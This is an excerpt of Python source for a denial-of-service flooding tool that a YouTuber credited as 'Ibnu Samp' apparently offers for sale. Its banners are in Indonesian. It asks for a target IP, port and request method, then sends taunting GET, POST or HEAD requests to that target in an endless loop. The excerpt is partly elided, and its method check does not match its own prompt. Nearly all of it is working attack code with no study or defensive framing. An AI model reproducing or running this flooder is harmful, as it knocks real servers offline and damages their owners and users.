...
import time
import os
os.system('color ' +random.choice(['B'])+ " & cls & title Tools DDoS Used By Ibnu Samp [ masukin Password ]")
password = input("[ + ] Masukin Passwordnya : ")
if password == "YT Ibnu Samp":
    print("correct password")
    time.sleep(2)
else :
    print("Passwordnya salah mamank")
...
if sys.platform.startswith("linux"):
   ...
   os.system('color ' +random.choice(['B'])+ " & cls & title Tools DDoS Used By Ibnu Samp [ DDoS Attack ]")
print("=======================================================================================")
print("YT Ibnu Samp ")
print("JANGAN LUPA SUBSCRIBE YA ")
print("BY : Ibnu Samp ")
print("JANGAN NGAMBIL SEMBARANGAN:V")
print("JUAL TOOLS NYA")
print("20K MINAT? ")
print("SUBSCRIBE ")
print("[ + ] Author/Use : Ibnu")
print("[ + ] Update Tool: Ibnu")
print("==========================")
ip = str(input("[+] Isi IP : "))
port = int(input("[+] Isi Port [80] : "))
method_attack = str(input("[+] Metode apa nih?  [Get/Post/Head] : "))
...
def Headers(method, referers=None):
    ...
    if method == "get" or method == "head":
        post_host = "POST /Your_Server_Got_DDoS_By_Ibnu Samp_Will_Not_Surrender HTTP/1.1\r\nHost: " + ip + "\r\n"
...
def run():
    ...
    if method_attack == "1":
        get_host = "GET /Your_Server_Got_DDoS_By_Ibnu Samp_Will_Not_Surrender HTTP/1.1\r\nHost: " + ip + "\r\n"
        request  = get_host + header + "\r\n"
    else:
        get_host = random.choice(['GET','POST','HEAD']) + " /Your_Server_Got_DDoS_By_Ibnu Samp_Will_Not_Surrender HTTP/1.1\r\nHost: " + ip + "\r\n"
        request  = get_host + header + "\r\n"
    while True:
        try:
            ...
            s.close()
            print("[ + ] Ibnu Samp Attacking Server IP => ",ip," In Port ",port,"!")
